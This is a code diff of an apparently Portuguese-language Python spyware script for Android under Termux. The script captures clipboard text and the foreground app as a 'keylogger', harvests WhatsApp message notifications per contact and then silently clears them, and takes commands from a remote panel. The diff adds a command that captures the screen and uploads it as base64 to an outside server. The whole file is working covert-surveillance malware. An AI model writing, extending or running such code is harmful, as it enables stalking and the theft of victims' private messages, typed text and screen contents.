@@ -9,6 +9,7 @@ from datetime import datetime
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
 URL_UPLOAD_LOTE = "https://nexos-panel.onrender.com/api/upload_lote"
+URL_UPLOAD_FOTO = "https://nexos-panel.onrender.com/api/upload_camera"
 URL_PING = "https://nexos-panel.onrender.com/"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
 
@@ -41,7 +42,7 @@ ultimo_ping = 0
 ultimo_whatsapp = 0
 ultimo_keylog = 0
 historico_msg = {}
-msg_processadas = set()  # Evita duplicatas
+msg_processadas = set()
 
 def obter_rede():
     w = run("termux-wifi-connectioninfo")
@@ -70,7 +71,6 @@ def obter_gps():
     gps_ok = False
 
 def obter_app_aberto():
-    """Detecta qual app está em primeiro plano"""
     foco = run("dumpsys window | grep mCurrentFocus", timeout=3)
     if foco:
         foco_lower = foco.lower()
@@ -79,126 +79,74 @@ def obter_app_aberto():
     return "outro"
 
 def obter_texto_digitado():
-    """Captura texto da área de transferência e campo de texto"""
-    texto = ""
-    
-    # Tenta pegar da área de transferência (última coisa copiada/digitada)
     clip = run("termux-clipboard-get", timeout=2)
-    if clip and len(clip) > 0:
-        texto = clip[:200]
-    
-    # Tenta pegar do input method (campo de texto ativo)
-    input_text = run("dumpsys input_method | grep -A5 'mCur' | grep 'text=' | head -1", timeout=2)
-    if input_text and "text=" in input_text:
-        try:
-            texto = input_text.split("text=")[1].split(",")[0][:200]
-        except:
-            pass
-    
-    return texto if texto else None
+    if clip and len(clip) > 0: return clip[:200]
+    return None
+
+def capturar_print():
+    """Tira screenshot da tela e retorna base64"""
+    arq = os.path.expanduser("~/nexos_screenshot.png")
+    if os.path.exists(arq): os.remove(arq)
+    try:
+        subprocess.run(f"screencap -p {arq}", shell=True, timeout=5)
+        time.sleep(1)
+        if os.path.exists(arq) and os.path.getsize(arq) > 500:
+            with open(arq, "rb") as f:
+                b64 = base64.b64encode(f.read()).decode('utf-8')
+            os.remove(arq)
+            return b64
+    except: pass
+    if os.path.exists(arq): os.remove(arq)
+    return None
 
 def obter_whatsapp():
-    """Ler notificações e REMOVE duplicatas"""
     global ultimo_whatsapp, historico_msg, msg_processadas
     agora = time.time()
-    if agora - ultimo_whatsapp < 8:
-        return list(historico_msg.values())
-    
+    if agora - ultimo_whatsapp < 8: return list(historico_msg.values())
     notif = run("termux-notification-list", timeout=5)
     if notif:
         try:
             dados = json.loads(notif)
             novas_msgs = False
-            
             for n in dados:
                 pkg = n.get("packageName", "")
                 if "whatsapp" in pkg.lower():
                     pessoa = n.get("title", "WhatsApp")[:30]
                     texto = n.get("content", "")
                     msg_id = n.get("key", "") or f"{pessoa}_{texto[:50]}_{n.get('when','')}"
-                    
-                    # PULA se já processou essa mensagem
-                    if msg_id in msg_processadas:
-                        continue
-                    
+                    if msg_id in msg_processadas: continue
                     msg_processadas.add(msg_id)
                     novas_msgs = True
-                    
-                    # Mantém só últimas 500 IDs
-                    if len(msg_processadas) > 500:
-                        msg_processadas.clear()
-                    
-                    # Detecta mídia
-                    tem_midia = False
-                    tipo_midia = ""
-                    if any(x in texto.lower() for x in ["📷", "photo", "imagem"]):
-                        tem_midia = True; tipo_midia = "📷 Foto"
-                    elif any(x in texto.lower() for x in ["🎥", "video", "vídeo"]):
-                        tem_midia = True; tipo_midia = "🎥 Vídeo"
-                    elif any(x in texto.lower() for x in ["🎵", "audio", "áudio"]):
-                        tem_midia = True; tipo_midia = "🎵 Áudio"
-                    elif any(x in texto.lower() for x in ["📎", "documento", "arquivo"]):
-                        tem_midia = True; tipo_midia = "📎 Arquivo"
-                    elif any(x in texto.lower() for x in ["figurinha", "sticker"]):
-                        tem_midia = True; tipo_midia = "😄 Figurinha"
-                    
-                    if tem_midia and not texto:
-                        texto = tipo_midia
-                    elif tem_midia:
-                        texto = f"{tipo_midia}: {texto}"
-                    
+                    if len(msg_processadas) > 500: msg_processadas.clear()
+                    tem_midia = False; tipo_midia = ""
+                    if any(x in texto.lower() for x in ["📷", "photo", "imagem"]): tem_midia = True; tipo_midia = "📷 Foto"
+                    elif any(x in texto.lower() for x in ["🎥", "video", "vídeo"]): tem_midia = True; tipo_midia = "🎥 Vídeo"
+                    elif any(x in texto.lower() for x in ["🎵", "audio", "áudio"]): tem_midia = True; tipo_midia = "🎵 Áudio"
+                    elif any(x in texto.lower() for x in ["📎", "documento", "arquivo"]): tem_midia = True; tipo_midia = "📎 Arquivo"
+                    elif any(x in texto.lower() for x in ["figurinha", "sticker"]): tem_midia = True; tipo_midia = "😄 Figurinha"
+                    if tem_midia and not texto: texto = tipo_midia
+                    elif tem_midia: texto = f"{tipo_midia}: {texto}"
                     if pessoa not in historico_msg:
-                        historico_msg[pessoa] = {
-                            "pessoa": pessoa,
-                            "mensagens": [],
-                            "ultima_msg": "",
-                            "total": 0,
-                            "midia": False
-                        }
-                    
-                    historico_msg[pessoa]["mensagens"].append({
-                        "texto": texto[:150] if texto else "(sem texto)",
-                        "midia": tem_midia,
-                        "hora": datetime.now().strftime("%H:%M"),
-                        "tipo": "recebida"
-                    })
-                    
-                    if len(historico_msg[pessoa]["mensagens"]) > 30:
-                        historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-30:]
-                    
+                        historico_msg[pessoa] = {"pessoa": pessoa, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
+                    historico_msg[pessoa]["mensagens"].append({"texto": texto[:150] if texto else "(sem texto)", "midia": tem_midia, "hora": datetime.now().strftime("%H:%M"), "tipo": "recebida"})
+                    if len(historico_msg[pessoa]["mensagens"]) > 30: historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-30:]
                     historico_msg[pessoa]["ultima_msg"] = texto[:80]
                     historico_msg[pessoa]["total"] = len(historico_msg[pessoa]["mensagens"])
                     historico_msg[pessoa]["midia"] = tem_midia
-            
-            if novas_msgs:
-                # LIMPA notificações depois de processar
-                run("termux-notification-remove --all", timeout=3)
-            
+            if novas_msgs: run("termux-notification-remove --all", timeout=3)
             ultimo_whatsapp = agora
-        except:
-            pass
-    
+        except: pass
     return list(historico_msg.values())
 
 def obter_keylog():
-    """Keylogger real - captura texto digitado + app aberto"""
     global ultimo_keylog
     agora = time.time()
-    if agora - ultimo_keylog < 3:
-        return None
-    
+    if agora - ultimo_keylog < 3: return None
     app = obter_app_aberto()
     texto = obter_texto_digitado()
-    
     if app in ["whatsapp", "instagram"] or texto:
         ultimo_keylog = agora
-        return {
-            "app": app,
-            "ativo": True,
-            "texto": texto or "",
-            "timestamp": datetime.now().strftime("%H:%M:%S")
-        }
-    
+        return {"app": app, "ativo": True, "texto": texto or "", "timestamp": datetime.now().strftime("%H:%M:%S")}
     ultimo_keylog = agora
     return None
 
@@ -206,10 +154,13 @@ def executar_comando(acao):
     print(f"   🔧 {acao}")
     if acao == "vibrar": run("termux-vibrate -d 1000", timeout=3)
     elif acao == "som": run("termux-media-player play scan", timeout=3)
-    elif acao == "lanterna":
-        run("termux-torch on", timeout=3)
-        time.sleep(2)
-        run("termux-torch off", timeout=3)
+    elif acao == "lanterna": run("termux-torch on", timeout=3); time.sleep(2); run("termux-torch off", timeout=3)
+    elif acao == "print_tela":
+        print("   📱 Tirando print da tela...")
+        b64 = capturar_print()
+        if b64:
+            r = requests.post(URL_UPLOAD_FOTO, json={"device_id": DEVICE_ID, "tipo": "screen", "photo": b64}, timeout=20)
+            print(f"   {'✅ Print enviado!' if r.status_code == 200 else '❌ Falha'}")
 
 def enviar_dados(payload):
     json_str = json.dumps(payload).replace("'", "'\\''")
@@ -235,7 +186,7 @@ def enviar_lote(front_b64, back_b64):
         return r.status_code == 200
     except: return False
 
-print("🛰️  INICIADO v3.1 (Sem duplicatas + Keylogger real)\n")
+print("🛰️  INICIADO v3.1 + Print Manual\n")
 
 while True:
     t0 = time.time()
@@ -272,12 +223,9 @@ while True:
         
         extra = ""
         if keylog and keylog.get("ativo"): extra += f" | ⌨️ {keylog['app']}"
-        if msgs_whats: extra += f" | 💬 {len(msgs_whats)} chats"
+        if msgs_whats: extra += f" | 💬 {len(msgs_whats)}"
         
         print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede}{extra} | {dt:.1f}s")
-        
-        if keylog and keylog.get("texto"):
-            print(f"   ⌨️ Texto: {keylog['texto'][:80]}")
         
         if cmd_remoto != "none": executar_comando(cmd_remoto)
         
